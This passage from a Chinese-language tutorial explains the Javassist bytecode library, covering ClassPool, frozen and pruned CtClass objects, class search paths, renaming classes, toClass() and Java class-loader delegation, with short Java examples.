<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Class clazz = cc.toClass();</span><br></pre></td></tr></table></figure>

<p><code>toClass</code> 请求当前线程的上下文类加载器去加载class文件，返回一个<code>java.lang.Class</code>对象。</p>
<p>例子：</p>
<h3 id="定义一个新类"><a href="#定义一个新类" class="headerlink" title="定义一个新类"></a>定义一个新类</h3><p>重新定义一个新的类，<code>ClassPool.makeClass</code>方法将会被调用：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义一个新的类</span></span><br><span class="line">ClassPool pool = ClassPool.getDefault();</span><br><span class="line">CtClass cc = pool.makeClass(<span class="string">"com.sec.Point"</span>);</span><br><span class="line">System.out.println(cc.toClass()); <span class="comment">// 输出class com.sec.Point</span></span><br></pre></td></tr></table></figure>

<p>这个程序定义了一个<code>Point</code>类，未包含任何成员，成员方法可以通过使用<code>CtClass</code>的<code>addMethod()</code>方法传入一个<code>CtMethod</code>的factory方法创建的对象作为参数来追加。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义一个新的类</span></span><br><span class="line">ClassPool pool = ClassPool.getDefault();</span><br><span class="line">CtClass cc = pool.makeClass(<span class="string">"hello.make.Point"</span>);</span><br><span class="line"><span class="comment">//System.out.println(cc2.toClass().getMethods().length); // 9</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 追加方法</span></span><br><span class="line">cc.addMethod(CtMethod.make(<span class="string">"public void sayHello()&#123;\n"</span> +</span><br><span class="line">        <span class="string">"        System.out.println(\"Hello!\");\n"</span> +</span><br><span class="line">        <span class="string">"    &#125;"</span>,cc));</span><br><span class="line">System.out.println(cc.toClass().getMethods().length);  <span class="comment">// 10</span></span><br></pre></td></tr></table></figure>

<p><code>makeClass()</code>方法不能创建一个新的接口，需要使用<code>makeInterface()</code>方法才可以创建一个新的接口。 接口中的成员方法可以通过<code>CtMethod</code>的<code>abstractMethod</code>方法创建。</p>
<p>以上这个例子会报错：<code>com.sec.Point class is frozen</code></p>
<h3 id="Frozen冻结类"><a href="#Frozen冻结类" class="headerlink" title="Frozen冻结类"></a>Frozen冻结类</h3><blockquote>
<p> <strong>冻结类的含义</strong></p>
<p>如果一个<code>CtClass</code>对象通过<code>writeFile()</code>、<code>toBytecode</code>、<code>toClass()</code>方法被转换到class文件中，Javassist则会冻结这个<code>CtClass</code>对象。再对这个<code>CtClass</code>对象进行操作则是不允许的，当开发者尝试去修改一个已经被JVM加载过的class文件的时候会发出警告，因为JVM不允许重复加载一个class。</p>
</blockquote>
<p>一个冻结的<code>CtClass</code>可以通过其<code>defrost()</code>方法解冻，解冻后可以允许对这个CtClass修改：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 被冻结了，不能再修改(Exception in thread "main" java.lang.RuntimeException: com.sec.Point class is frozen)</span></span><br><span class="line"><span class="comment">// 解冻后可以修改</span></span><br><span class="line">cc.toBytecode();或者cc.toClass()<span class="comment">// 被冻结</span></span><br><span class="line">cc.defrost();<span class="comment">// 解冻</span></span><br><span class="line"><span class="comment">//以上两部顺序不能反，都是先解冻再修改。</span></span><br><span class="line">System.out.println(cc.getFields().length);</span><br><span class="line">cc.addField(CtField.make(<span class="string">"private String name;"</span>, cc));<span class="comment">// 解冻后允许修改</span></span><br><span class="line">cc.writeFile();</span><br><span class="line">System.out.println(cc.getFields().length);</span><br></pre></td></tr></table></figure>



<h3 id="修剪类-prune"><a href="#修剪类-prune" class="headerlink" title="修剪类 prune"></a>修剪类 prune</h3><p>如果ClassPool.doPruning被设置为true，那么当Javassist冻结一个CtClass对象时，Javassist就会对该对象中包含的数据结构进行修剪。为了减少内存消耗，修剪会丢弃该对象中不必要的属性（attribute_info结构）。例如，Code_attribute结构（方法体）会被丢弃。因此，当一个CtClass对象被修剪后，除了方法名、签名和注释外，无法访问方法的字节码。修剪后的CtClass对象不能再被解冻。ClassPool.doPruning 的默认值是 false。</p>
<p>要禁止修剪一个特定的CtClass，必须事先对该对象调用stopPruning(true)。</p>
<p>在调试时，你可能想暂时停止修剪和冻结，并将修改后的类文件写入磁盘驱动器。debugWriteFile()是一个方便的方法。它停止修剪，写入一个类文件，将其解冻，并再次开启修剪（如果最初是开启的）。</p>
<h3 id="类搜索路径"><a href="#类搜索路径" class="headerlink" title="类搜索路径"></a>类搜索路径</h3><p>默认的<code>ClassPool.getDefault()</code>检索路径和JVM底层路径一致（classpath）。<strong><em>如果一个程序运行在一个web应用程序比如JBoss、Tomcat中，<code>ClassPool</code>对象则可能搜索不到用户的类</em></strong>，因为这样的Web应用服务器使用多个类加载器以及系统类加载器。==在这种情况下，一个额外的classpath必须注册到<code>ClassPool</code>中==。假设pool引用了一个ClassPool对象：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//添加class查找路径search path</span></span><br><span class="line">pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(<span class="keyword">this</span>.getClass()));</span><br></pre></td></tr></table></figure>

<p>这个语句注册了用于加载这个对象类的类路径。你可以使用任何Class对象作为参数来代替this.getClass()。<code>Class</code>对象已经被注册上了的表现就是它所在的class path被加载了。</p>
<p>你也可以注册一个目录的名称作为一个class查找路径。例如，以下代码添加了<code>/usr/local/javalib</code>到class查找路径中：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 添加文件目录作为class查找路径</span></span><br><span class="line">pool.insertClassPath(<span class="string">"/usr/local/javalib"</span>);</span><br></pre></td></tr></table></figure>

<p>还可以添加URL作为class查找路径：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 添加URL作为class查找路径，第三个参数必须/开头、第四个参数必须.结尾</span></span><br><span class="line"><span class="comment">// 添加 "http://www.javassist.org:80/java/"</span></span><br><span class="line">ClassPath cp = <span class="keyword">new</span> URLClassPath(<span class="string">"www.javassist.org"</span>, <span class="number">80</span>, <span class="string">"/java/"</span>, <span class="string">"org.javassist."</span>);</span><br><span class="line">pool.insertClassPath(cp);</span><br></pre></td></tr></table></figure>

<p>上面操作添加了<code>http://www.javassist.org:80/java/</code>到class查找路径中。这个URL仅仅用来查找<code>org.javassist.</code>包的类。</p>
<p>例如：加载一个<code>org.javassist.test.Main</code>类，它的class文件是： <code>http://www.javassist.org:80/java/org/javassist/test/Main.class</code> </p>
<p>此外，你还可以直接给一个byte数组去构建一个<code>CtClass</code>对象，可以使用<code>ByteArrayClassPath</code>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// byte数组形式class path</span></span><br><span class="line">ClassPool pool2 = ClassPool.getDefault();</span><br><span class="line"><span class="keyword">byte</span>[] arr = <span class="string">"org.byron4j"</span>.getBytes();</span><br><span class="line">String name = <span class="string">"org.byron4j.Hello"</span>;</span><br><span class="line">pool2.insertClassPath(<span class="keyword">new</span> ByteArrayClassPath(name, arr));</span><br><span class="line">CtClass ctClass = pool2.get(name);</span><br></pre></td></tr></table></figure>

<p><code>CtClass</code>对象ctClass表示字节数组b指定的class文件定义的类实例。<code>ClassPool</code>从给定的<code>ByteArrayClassPath</code>读取一个class文件。</p>
<p>如果调用get()并且给get()的类名等于name指定的类名，则ClassPool从给定的ByteArrayClassPath中读取类文件。</p>
<p>如果你不确定类的完全限定名，你可以使用<code>ClassPool</code>的<code>makeClass</code>方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// makeClass</span></span><br><span class="line">ClassPool pool3 = ClassPool.getDefault();</span><br><span class="line">InputStream ins = <span class="keyword">new</span> FileInputStream(<span class="string">"/usr/local/javalib"</span>);</span><br><span class="line">CtClass ctClass1 = pool3.makeClass(ins);</span><br></pre></td></tr></table></figure>

<p>这里，makeClass() 返回从给定的输入流构建的 CtClass 对象。</p>
<p>你可以使用makeClass()将类文件急切地送入ClassPool对象。如果搜索路径包含一个大的jar文件，这可以提高性能。由于ClassPool对象按需读取类文件，它可能会重复搜索整个jar文件中的每一个类文件，makeClass()可以用来优化这种搜索。makeClass()构造的CtClass会被保存在ClassPool对象中，并且永远不会再读取类文件。</p>
<p>用户可以扩展class查找路径。可以定义一个实现<code>ClassPath</code>接口的新类，并将该类的一个实例交给ClassPool中的insertClassPath()。这种方式可以允许将非标准资源包含到class查找路径中。</p>
<h2 id="ClassPool"><a href="#ClassPool" class="headerlink" title="ClassPool"></a>ClassPool</h2><p>一个ClassPool对象是CtClass对象的容器。一旦一个CtClass对象被创建，它将永远记录在ClassPool中。这是因为编译器在以后编译引用该CtClass所代表的类的源代码时，可能需要访问该CtClass对象。</p>
<p>例如，假设一个新的方法getter()被添加到代表Point类的CtClass对象中。之后，程序试图编译包括Point中对getter()的方法调用的源代码，并将编译后的代码作为方法的主体，将其添加到另一个类Line中。如果丢失了代表Point的CtClass对象，编译器就无法编译对getter()的方法调用。请注意，原来的类定义并不包括getter()。因此，为了正确地编译这样的方法调用，ClassPool必须在程序执行的所有时间都包含CtClass的所有实例。</p>
<h3 id="避免内存不足"><a href="#避免内存不足" class="headerlink" title="避免内存不足"></a>避免内存不足</h3><p>如果CtClass对象的数量变得大得惊人，ClassPool的这种规范可能会造成巨大的内存消耗（这种情况很少发生，因为Javassist试图通过各种方式减少内存消耗：冻结calss等方式）。为了避免这个问题，你可以明确地从ClassPool中删除一个不必要的CtClass对象。如果你在一个CtClass对象上调用detach()，那么这个CtClass对象就会从ClassPool中删除。例如</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ClassPool classPool = ClassPool.getDefault();</span><br><span class="line">CtClass cc = classPool.get(<span class="string">"org.byron4j.cookbook.javaagent.Javassist2ClassPool"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用该方法后，会将CtClass对象从ClassPool中移除</span></span><br><span class="line">cc.writeFile();</span><br><span class="line">cc.detach();</span><br></pre></td></tr></table></figure>

<p>在detach()被调用后，你不能调用该CtClass对象上的任何方法。但是，你可以在ClassPool上调用get()来制作一个新的代表同一个类的CtClass实例。如果你调用get()，ClassPool会再次读取一个类文件，并新创建一个CtClass对象，这个对象由get()返回。</p>
<p>另一个想法是偶尔用新的ClassPool替换一个ClassPool，并丢弃旧的ClassPool。如果一个旧的ClassPool被垃圾回收，那么该ClassPool中包含的CtClass对象也会被垃圾回收。要创建一个新的ClassPool实例，请执行以下代码片段:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ClassPool cp = <span class="keyword">new</span> ClassPool(<span class="keyword">true</span>)<span class="comment">//简单粗暴</span></span><br><span class="line"><span class="comment">// if needed, append an extra search path by appendClassPath()</span></span><br></pre></td></tr></table></figure>

<p>这将创建一个ClassPool对象，它的行为就像ClassPool.getDefault()返回的默认ClassPool一样，getDefault()只是一个方便的方法。</p>
<p>注意，new ClassPool(true)是一个方便的构造函数，它可以构造一个ClassPool对象，并将系统搜索路径附加到它上面。调用该构造函数相当于下面的代码。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ClassPool cp = <span class="keyword">new</span> ClassPool();</span><br><span class="line">cp.appendSystemPath();  <span class="comment">// or append another path by appendClassPath()</span></span><br></pre></td></tr></table></figure>



<h3 id="级联ClassPool"><a href="#级联ClassPool" class="headerlink" title="级联ClassPool"></a>级联ClassPool</h3><p>如果程序运行在Web应用服务器上，是需要创建ClassPool的多个实例；应该为每个类加载器（容器）创建一个ClassPool的实例。==程序应该通过不调用getDefault()而调用ClassPool的构造函数来创建ClassPool对象==。</p>
<p>多个ClassPool对象可以像java.lang.ClassLoader一样级联。比如说 </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 级联ClassPool</span></span><br><span class="line">ClassPool parent = ClassPool.getDefault();</span><br><span class="line">ClassPool child = <span class="keyword">new</span> ClassPool(parent);</span><br><span class="line">child.insertClassPath(<span class="string">"./classes"</span>);</span><br></pre></td></tr></table></figure>

<p>如果调用了child.get()，子ClassPool首先委托给父ClassPool。如果父ClassPool未能找到一个类文件，那么子ClassPool会尝试在./classes目录下找到一个类文件。</p>
<p>如果child.childFirstLookup为true，则子ClassPool在委托给父ClassPool之前，会尝试查找类文件。例如</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// child classpool在委托之前加载类文件</span></span><br><span class="line">ClassPool parent2 = ClassPool.getDefault();</span><br><span class="line">ClassPool child2 = <span class="keyword">new</span> ClassPool(parent2);</span><br><span class="line">child2.appendSystemPath();         <span class="comment">// 和默认同样的class查找路径</span></span><br><span class="line">child2.childFirstLookup = <span class="keyword">true</span>;    <span class="comment">// 改变child的行为</span></span><br></pre></td></tr></table></figure>



<h3 id="改变类名来定义新类"><a href="#改变类名来定义新类" class="headerlink" title="改变类名来定义新类"></a>改变类名来定义新类</h3><p>一个新的class可以被定义为一个已存在的类的副本。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ClassPool pool3 = ClassPool.getDefault();</span><br><span class="line">CtClass cc3 = pool3.get(<span class="string">"org.byron4j.cookbook.javaagent.Point"</span>);</span><br><span class="line">cc3.setName(<span class="string">"Pair"</span>);</span><br></pre></td></tr></table></figure>

<p>这个程序首先包含类Point的ctClass对象，然后调用<code>setName()</code>方法为CtClass对象设置新的名称。</p>
<p>在这个调用之后，该CtClass对象所代表的类定义中所有出现的类名都由Point改为Pair。类定义的其他部分不会改变。</p>
<p>注意，CtClass中的setName()会改变ClassPool对象中的一条记录。从实现的角度来看，ClassPool对象是一个CtClass对象的哈希表，setName()改变了哈希表中与CtClass对象相关联的key。该键由原来的类名改为新的类名。</p>
<p>因此，如果以后再次调用ClassPool对象的get(“Point”)，那么它再也不会返回变量cc3所指的CtClass对象。ClassPool对象又读取了一个类文件Point.class，它为类Point构造了一个新的CtClass对象。这是因为与名称Point相关联的CtClass对象已经不存在了。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ClassPool pool = ClassPool.getDefault();</span><br><span class="line">CtClass cc = pool.get(<span class="string">"org.byron4j.cookbook.javaagent.Point"</span>);</span><br><span class="line">CtClass cc1 = pool.get(<span class="string">"org.byron4j.cookbook.javaagent.Point"</span>);</span><br><span class="line">cc.setName(<span class="string">"Pair"</span>);</span><br><span class="line">CtClass cc2 = pool.get(<span class="string">"Pair"</span>);</span><br><span class="line">CtClass cc3 = pool.get(<span class="string">"org.byron4j.cookbook.javaagent.Point"</span>);</span><br><span class="line">System.out.println(cc == cc2);  <span class="comment">// true;</span></span><br><span class="line">System.out.println(cc3 == cc2); <span class="comment">// false;</span></span><br></pre></td></tr></table></figure>

<p>cc1和cc2指的是和cc一样的CtClass实例，而cc3没有。请注意，在执行cc.setName(“Pair”)后，cc和cc1引用的CtClass对象代表Pair类，所以cc2是去寻找Pair类而cc3还是去寻找Point类。</p>
<p><code>ClassPool</code> 对象用于维护类和CtClass的一对一映射关系。javassist不允许两个不一样的CtClass表示同一个class，除非是两个独立的ClassPool创建的。</p>
<p>为了创建一个默认ClassPool实例(Clas.getDefault()返回的)的一个副本，可以使用以下代码片段：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ClassPool cp = <span class="keyword">new</span> ClassPool(<span class="keyword">true</span>);</span><br></pre></td></tr></table></figure>

<p>这样一来，你拥有了两个ClassPool对象，可以从每一个ClassPool提供不同的CtClass对象表示同一个类。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ClassPool pool10 = ClassPool.getDefault();</span><br><span class="line">CtClass ctClass10 = pool10.get(<span class="string">"org.byron4j.cookbook.javaagent.Point"</span>);</span><br><span class="line">ClassPool pool20 = <span class="keyword">new</span> ClassPool(<span class="keyword">true</span>);</span><br><span class="line">CtClass ctClass20 = pool20.get(<span class="string">"org.byron4j.cookbook.javaagent.Point"</span>);</span><br><span class="line">System.out.println(pool10 == pool20);   <span class="comment">// false 不同的ClassPool中表示同一个类的CtClass对象</span></span><br></pre></td></tr></table></figure>



<h3 id="通过重命名一个冻结的CtClass来创建一个新的CtClass对象"><a href="#通过重命名一个冻结的CtClass来创建一个新的CtClass对象" class="headerlink" title="通过重命名一个冻结的CtClass来创建一个新的CtClass对象"></a>通过重命名一个冻结的CtClass来创建一个新的CtClass对象</h3><p>一旦一个CtClass对象已经被writeFile()或者toBytecode()方法转到class文件，Javassist拒绝进一步修改该CtClass对象。因此，如果代表Point类的CtClass对象冻结后不能通过setName()修改它的名称。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ClassPool pool = ClassPool.getDefault();</span><br><span class="line">CtClass cc = pool.get(<span class="string">"org.byron4j.cookbook.javaagent.Point"</span>);</span><br><span class="line">cc.writeFile();<span class="comment">// 被冻结</span></span><br><span class="line">cc.setName(<span class="string">"Pair"</span>);<span class="comment">// 错误</span></span><br></pre></td></tr></table></figure>

<p>为了打破这个约束，可以使用ClassPool的<code>getAndRename()</code>方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ClassPool pool30 = ClassPool.getDefault();</span><br><span class="line">CtClass ctClass30 = pool30.get(<span class="string">"org.byron4j.cookbook.javaagent.Point"</span>);</span><br><span class="line">ctClass30.writeFile();<span class="comment">// 被冻结</span></span><br><span class="line"><span class="comment">//ctClass30.setName("Pair");// 冻结后不能使用--错误</span></span><br><span class="line">pool30.getAndRename(<span class="string">"org.byron4j.cookbook.javaagent.Point"</span>, <span class="string">"Pair"</span>);</span><br></pre></td></tr></table></figure>

<p>这是因为，如果调用getAndRename()，ClassPool首先读取Point.class来创建一个新的代表Point类的CtClass对象。然而，它在将该CtClass对象记录在哈希表中之前，会将该CtClass对象从Point重命名为Pair。因此，getAndRename()可以在调用代表Point类的CtClass对象的writeFile()或toBytecode()之后执行。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> CtClass <span class="title">getAndRename</span><span class="params">(String orgName, String newName)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> NotFoundException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 获取一个新的CtClass对象</span></span><br><span class="line">    CtClass clazz = get0(orgName, <span class="keyword">false</span>);</span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="keyword">null</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> NotFoundException(orgName);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (clazz <span class="keyword">instanceof</span> CtClassType)</span><br><span class="line">        ((CtClassType)clazz).setClassPool(<span class="keyword">this</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置新的名称</span></span><br><span class="line">    clazz.setName(newName);         <span class="comment">// indirectly calls</span></span><br><span class="line">                                    <span class="comment">// classNameChanged() in this class</span></span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="ClassLoader-类加载"><a href="#ClassLoader-类加载" class="headerlink" title="ClassLoader 类加载"></a>ClassLoader 类加载</h2><p>如果事先知道必须修改什么类，那么修改类的最简单方法如下。</p>
<ol>
<li>通过调用ClassPool.get()获得一个CtClass对象。</li>
<li>修改它</li>
<li>在该CtClass对象上调用writeFile()或toBytecode()来获取修改后的类文件。</li>
</ol>
<p>如果一个类是否被修改是在加载时确定的，用户必须使Javassist与一个类加载器协作。Javassist可以与类加载器配合使用，这样就可以在加载时修改字节码。Javassist的用户可以定义自己版本的类加载器，但也可以使用Javassist提供的类加载器。</p>
<h3 id="CtClass的toClass-方法"><a href="#CtClass的toClass-方法" class="headerlink" title="CtClass的toClass()方法"></a>CtClass的toClass()方法</h3><p>CtClass提供了一个方便的方法toClass()，它请求当前线程的上下文类加载器加载CtClass对象所代表的类。要调用这个方法，调用者必须有相应的权限，否则，可能会抛出一个SecurityException。</p>
<p>下面的程序显示了如何使用toClass()：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Hello</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">say</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Hello"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ClassPool cp = ClassPool.getDefault();</span><br><span class="line">        CtClass cc = cp.get(<span class="string">"Hello"</span>);</span><br><span class="line">        CtMethod m = cc.getDeclaredMethod(<span class="string">"say"</span>);</span><br><span class="line">        m.insertBefore(<span class="string">"&#123; System.out.println(\"Hello.say():\"); &#125;"</span>);</span><br><span class="line">        Class c = cc.toClass();</span><br><span class="line">        Hello h = (Hello)c.newInstance();</span><br><span class="line">        h.say();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>Test.main()在Hello的say()的方法体中插入了对println()的调用。然后构造一个修改后的Hello类的实例，并在该实例上调用say()。</p>
<p>注意，==上面的程序取决于在调用toClass()之前，Hello类从未被加载==。如果不是这样，JVM就会在toClass()请求加载修改后的Hello类之前加载原来的Hello类。因此，加载修改后的Hello类会失败（会抛出LinkageError）。例如，如果Test中的main()是这样的。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    Hello orig = <span class="keyword">new</span> Hello();</span><br><span class="line">    ClassPool cp = ClassPool.getDefault();</span><br><span class="line">    CtClass cc = cp.get(<span class="string">"Hello"</span>);</span><br><span class="line">        :</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那么原来的Hello类在main的第一行就被加载了，而调用toClass()会抛出一个异常，因为==类加载器不能同时加载两个不同版本的Hello类==。</p>
<p><strong><em>如果程序运行在web容器中例如JBoss、Tomcat中，</em></strong> 上下文的类加载器使用<code>toClass()</code>方法可能并不适当。在这种情况下，你可能会看到一个不期望的异常<code>ClassCastException</code>。为了避免这种情况，你==必须明白清楚地给定一个适当的类加载器给<code>toClass</code>方法==。例如，如果<code>bean</code>是你的会话的bean对象：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">CtClass cc = ...</span><br><span class="line">Class c = cc.toClass(bean.getClass().getClassLoader());</span><br></pre></td></tr></table></figure>

<p>提供toClass()是为了方便。如果你需要更复杂的功能，你应该编写自己的类加载器。</p>
<h3 id="Java中的类加载"><a href="#Java中的类加载" class="headerlink" title="Java中的类加载"></a>Java中的类加载</h3><p>在Java中，多个类加载器可以共存，每个类加载器创建自己的命名空间。不同的类加载器可以加载具有相同类名的不同class文件，加载的两个类视为不同的类，这一个特性保证我们可以在一个JVM中运行多个应用程序即使这些程序包含相同类名的不同类实例。</p>
<p><strong>注意:</strong></p>
<p>==JVM不允许动态的重新加载一个类。一旦某个类加载器加载了某个类后，它就不能在运行时再重新加载一个新版本的类了。==</p>
<p>因此，你==不能在JVM加载类后，再去变更类的定义。==</p>
<p>但是，JPDA（Java平台调试架构）提供了有限的类重加载能力。</p>
<p>如果相同的class文件被不同的类加载器加载了，==JVM会使用相同的名称和定义创建两个不同的类==，这两个类会被看做是不同的。既然这两个类是不同的，所以一个类的实例就不能分配给另一个类类型的变量了。两个类之间的转码操作失败，并抛出一个ClassCastException。</p>
<p>例如，下面的代码片段就会抛出一个ClassCastException异常。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">MyClassLoader myLoader = <span class="keyword">new</span> MyClassLoader();</span><br><span class="line">Class clazz = myLoader.loadClass(<span class="string">"Box"</span>);</span><br><span class="line">Object obj = clazz.newInstance();</span><br><span class="line">Box b = (Box)obj;<span class="comment">// this always throws ClassCastException.</span></span><br></pre></td></tr></table></figure>

<p>Box类是由两个类加载器加载的。假设一个类加载器CL加载一个包括这个代码片段的类。由于这个代码片段引用了MyClassLoader、Class、Object和Box，CL也会加载这些类（除非它委托给另一个类加载器）。因此，变量b的类型就是CL加载的Box类。另一方面，myLoader也加载Box类。对象obj是myLoader加载的Box类的一个实例。因此，最后一条语句总是抛出一个ClassCastException，因为obj的类与作为变量b类型的Box类的不同版本。</p>
<p><strong>多个类加载器形成一个树结构</strong>:</p>
<p>每个类加载器（引导加载器BootstrapClassLoader除外）都有一个父的类加载器（通常是加载了该子类加载器的类）。类加载请求可以沿着这个类加载器层级委托，一个类可能会被不是你请求的类加载器去加载。因此，被请求去加载一个类C的类加载器和实际加载这个类C的加载器可能不是同一个类加载器。以示区别，我们将前面的加载器称为<strong><em>C的启动器</em></strong>，后面的称为<strong><em>C的真实加载器</em></strong>。</p>
<p>此外，如果请求加载类C的类加载器CL（C的发起者）委托给父类加载器PL，之后，类加载器CL则再也不会被请求去加载类C定义中引用的任何类。CL不是类C的引用的类的启动器，相反，PL成为了类C的引用的类的启动器，并且PL将会被请求去加载它们。<strong>类C的定义所引用的类是由C的真正的加载器加载</strong>。</p>
<p>再看一个有些细微差异的示例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Point</span> </span>&#123;    <span class="comment">// 被PL加载</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> x, y;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getX</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> x; &#125;</span><br><span class="line">        :</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Box</span> </span>&#123;      <span class="comment">// 引导器是CL，但是真实加载器是PL</span></span><br><span class="line">    <span class="keyword">private</span> Point upperLeft, size;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getBaseX</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> upperLeft.x; &#125;</span><br><span class="line">        :</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Window</span> </span>&#123;    <span class="comment">// 被CL加载</span></span><br><span class="line">    <span class="keyword">private</span> Box box;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getBaseX</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> box.getBaseX(); &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>假设一个类<code>Window</code>被一个类加载器CL加载了，则它的引导器和真实加载器都是CL。因为Window的定义引用了Box，所以JVM会请求CL加载Box。这里，假设CL将这个任务委托给父类加载器PL。加载Box的发起者是CL，但真正的加载器是PL。在这种情况下，Point的发起者不是CL，而是PL，因为它与Box的真正加载器相同。因此，CL永远不会被请求加载Point。</p>
<p>接下来，让我们考虑一个稍加修改的例子。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Point</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> x, y;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getX</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> x; &#125;</span><br><span class="line">        :</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Box</span> </span>&#123;      <span class="comment">// 引导器是CL，但是真实加载器是PL</span></span><br><span class="line">    <span class="keyword">private</span> Point upperLeft, size;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Point <span class="title">getSize</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> size; &#125;</span><br><span class="line">        :</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Window</span> </span>&#123;    <span class="comment">// 被CL加载</span></span><br><span class="line">    <span class="keyword">private</span> Box box;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">widthIs</span><span class="params">(<span class="keyword">int</span> w)</span> </span>&#123;</span><br><span class="line">        Point p = box.getSize();</span><br><span class="line">        <span class="keyword">return</span> w == p.getX();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在<code>Window</code>类的定义也引用了<code>Point</code>类，在这个案例中，CL在被请求加载<code>Point</code>时也将委托给PL。<strong><em>你必须避免存在两个不同的类加载器重复加载同一个类</em></strong>，二者中的其中一个必须委托给另外一个。 如果在<code>Point</code>加载的时候，CL没有委托给PL，<code>widthIs()</code>将会抛出一个<code>ClassCastException</code>。因为<code>Box</code>的真实加载器是PL，<code>Box</code>中引用的类<code>Point</code>类也会被PL加载。因此，<code>getSize()</code>方法返回值是PL加载的<code>Point</code>的一个实例，然而<code>getSize()</code>方法中的变量是CL加载的<code>Point</code>类型，JVM将它们视作不同的类型，所以会抛出类型不匹配的异常。</p>
<p>这种行为有些不方便但却是必要的,如果<code>Point p = box.getSize();</code>不会抛出异常，则<code>Window</code>的程序员就打破了<code>Point</code>类的封装性。例如，在PL加载的Point中，字段x是私有的。但是，如果CL用下面的定义加载Point(public代替private)，Window类则可以直接访问x的值。</p>
